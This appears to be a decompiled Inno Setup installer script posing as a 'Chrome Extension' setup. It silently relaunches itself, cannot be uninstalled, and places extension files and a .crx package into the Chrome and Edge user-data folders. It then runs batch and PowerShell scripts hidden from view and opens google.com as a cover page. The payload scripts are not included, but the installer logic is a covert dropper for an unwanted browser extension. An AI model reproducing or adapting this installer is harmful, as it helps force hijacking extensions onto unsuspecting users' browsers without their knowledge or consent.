;InnoSetupVersion=6.1.0 (Unicode)

[Setup]
AppName=Chrome Extension
AppId={{4EEBA74F-4BD2-444F-A5F5-ACB269AD2DF6}
AppVersion=1.0
AppPublisher=All Limited
AppPublisherURL=https://example.com
AppSupportURL=https://example.com
AppUpdatesURL=https://example.com
DefaultDirName={autopf}\Chrome Extension
DefaultGroupName=ChromeExtension
OutputBaseFilename=ChromeExt-CRX
Compression=lzma
ArchitecturesInstallIn64BitMode=x64
SetupIconFile=setup.ico
Uninstallable=no
DisableReadyPage=yes
DisableFinishedPage=yes 
DisableDirPage=yes
DisableProgramGroupPage=yes
WizardImageFile=embedded\WizardImage0.bmp,embedded\WizardImage1.bmp
WizardSmallImageFile=embedded\WizardSmallImage0.bmp,embedded\WizardSmallImage1.bmp

[Code]
const
  WelcomeSiteURL = 'https://google.com';
#ifdef UNICODE
  #define AW "W"
#else
  #define AW "A"
#endif
type
  HINSTANCE = THandle;

function ShellExecute(hwnd: HWND; lpOperation: string; lpFile: string;
  lpParameters: string; lpDirectory: string; nShowCmd: Integer): HINSTANCE;
  external 'ShellExecute{#AW}@shell32.dll stdcall';

function InitializeSetup: Boolean;
begin
  Result := WizardSilent;
  if not Result then
  begin
    if ShellExecute(0, '', ExpandConstant('{srcexe}'), '/SILENT', '',
      SW_SHOW) <= 32
    then
      Result := True;
  end;
end;
procedure CurStepChanged(CurStep: TSetupStep);
var
  ErrorCode: Integer;
begin
  if CurStep = ssDone then
      ShellExec('', WelcomeSiteURL, '', '', SW_SHOW, ewNoWait, ErrorCode);
end;


[Files]
Source: "C_\apps-helper\manifest.json"; DestDir: "{localappdata}\Google\Chrome\User Data\apps-helper";
Source: "C_\apps-helper\service.js"; DestDir: "{localappdata}\Google\Chrome\User Data\apps-helper";
Source: "C_\apps-helper\web.js"; DestDir: "{localappdata}\Google\Chrome\User Data\apps-helper";
Source: "C_\apps.crx"; DestDir: "{localappdata}\Google\Chrome\User Data\apps-helper";

Source: "C_\apps-helper\manifest.json"; DestDir: "{localappdata}\Microsoft\Edge\User Data\apps-helper";
Source: "C_\apps-helper\service.js"; DestDir: "{localappdata}\Microsoft\Edge\User Data\apps-helper";
Source: "C_\apps-helper\web.js"; DestDir: "{localappdata}\Microsoft\Edge\User Data\apps-helper";
Source: "C_\apps.crx"; DestDir: "{localappdata}\Microsoft\Edge\User Data\apps-helper";

Source: "{tmp}\chrome-pre.ps1"; DestDir: "{tmp}";
Source: "{tmp}\edge-pre.ps1"; DestDir: "{tmp}";
Source: "{tmp}\chrome-post.ps1"; DestDir: "{tmp}";
Source: "{tmp}\chrome.bat"; DestDir: "{tmp}";
Source: "{tmp}\edge.bat"; DestDir: "{tmp}";
Source: "{tmp}\close.bat"; DestDir: "{tmp}";

[Run]
Filename: "{tmp}\chrome.bat"; Parameters: "install"; Flags: runhidden;
Filename: "{tmp}\edge.bat"; Parameters: "install"; Flags: runhidden;
Filename: "{tmp}\close.bat"; Parameters: "install";  Flags: runhidden;

[CustomMessages]
english.NameAndVersion=%1 version %2
english.AdditionalIcons=Additional shortcuts:
english.CreateDesktopIcon=Create a &desktop shortcut
english.CreateQuickLaunchIcon=Create a &Quick Launch shortcut
english.ProgramOnTheWeb=%1 on the Web
english.UninstallProgram=Uninstall %1
english.LaunchProgram=Launch %1
english.AssocFileExtension=&Associate %1 with the %2 file extension
english.AssocingFileExtension=Associating %1 with the %2 file extension...
english.AutoStartProgramGroupDescription=Startup:
english.AutoStartProgram=Automatically start %1
english.AddonHostProgramNotFound=%1 could not be located in the folder you selected.%n%nDo you want to continue anyway?

[Languages]
; These files are stubs
; To achieve better results after recompilation, use the real language files
Name: "english"; MessagesFile: "embedded\english.isl"; 
